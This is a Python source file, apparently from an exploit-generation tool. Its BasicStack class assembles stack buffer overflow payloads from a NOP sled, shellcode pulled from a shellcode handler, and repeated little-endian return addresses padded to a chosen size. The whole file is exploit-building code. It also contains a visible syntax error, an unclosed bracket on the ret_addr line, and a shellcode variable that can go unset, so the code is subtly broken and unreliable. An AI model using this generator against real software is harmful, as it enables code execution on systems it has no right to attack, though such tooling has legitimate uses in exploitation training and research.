#!/usr/bin/env python
#-*- coding: utf-8 -*-

from utils.utils import Utils
from shellcodes.shellcode_handler import ShellcodeHandler

class BasicStack(object):

    @staticmethod
    def payload(args):
        res = ''
        ret_addr = ''
        nop_op = '\x90'
        nops_num = 0
        ret_num = 0
        size = 0
        if 'nops_number' in args:
            # argparse returns a list with one item
            nops_num = args['nops_number'][0]
            if nops_num.isdigit():
                nops_num = int(nops_num)
            else:
                print('Number of NOPS parameter should be a digit.')
                return res
        if 'ret_number' in args:
            # argparse returns a list with one item
            ret_num = args['ret_number'][0]
            if ret_num.isdigit():
                ret_num = int(ret_num)
            else:
                print('Number of return address repetitions \
                        parameter should be a digit.')
                return res
        if 'ret_addr' in args:
            ret_addr = args['ret_addr' 
            ret_addr = Utils.addr_to_byte(ret_addr, bo='le')
        if 'shellcode_type' in args:
            sc_args = args['shellcode_type']
            shellcode = ShellcodeHandler.handle(sc_args)
        if 'size' in args:
            # argparse returns a list with one item
            size = args['size'][0]
            if size.isdigit():
                size = int(size)
            else:
                print('Size parameter should be a digit.')
                return res

        res, warning = BasicStack.__build_payload(size, nop_op, nops_num, 
                ret_addr, ret_num, shellcode)

        if warning == 1:
            print('The complete size of the payload is bigger than the size \
                    specified as a parameter.')
            print('The nops and return address repetition parameters have \
                    priority over the size parameter.')
            nops = nop_op * nops_num
            rets = ret_addr * ret_num
            pl = nops + shellcode + rets
            print('''NOPs number: {0}, shell size: {1}, \
                    return address: {2} ==> Real payload size:  {3} \
                    Size parameter: {4}'''.format(
                        len(nops), len(shellcode), len(rets), len(pl), size))

        return res

    @staticmethod
    def __build_payload(size, nop_op, nop_num, ret_addr, ret_num, sc):
        '''
        Simple decision tree
        '''
        payload = ''
        warning = 0
        if size != 0:
            if nop_num != 0:
                if ret_num != 0:
                    payload = nop_op * nop_num + sc + ret_addr * ret_num
                    if len(payload) > size:
                        warning = 1
                else:
                    ret_num = size - len(nop_op * nop_num + sc)
                    payload = nop_op * nop_num + sc + ret_addr * ret_num
            else:
                if ret_num != 0:
                    nop_num = size - len(sc + ret_addr * ret_num)
                    payload = nop_op * nop_num + sc + ret_addr * ret_num
                else:
                    ret_num = 1
                    nop_num = size - len(sc + ret_addr * ret_num)
                    payload = nop_op * nop_num + sc + ret_addr * ret_num
        else:
            if nop_num != 0:
                if ret_num != 0:
                    payload = nop_op * nop_num + sc + ret_addr * ret_num
                else:
                    ret_num = 1
                    payload = nop_op * nop_num + sc + ret_addr * ret_num
            else:
                # This branch has not NOPs
                if ret_num != 0:
                    payload = sc + ret_addr * ret_num
                else:
                    ret_num = 1
                    payload = sc + ret_addr * ret_num
        return payload, warning

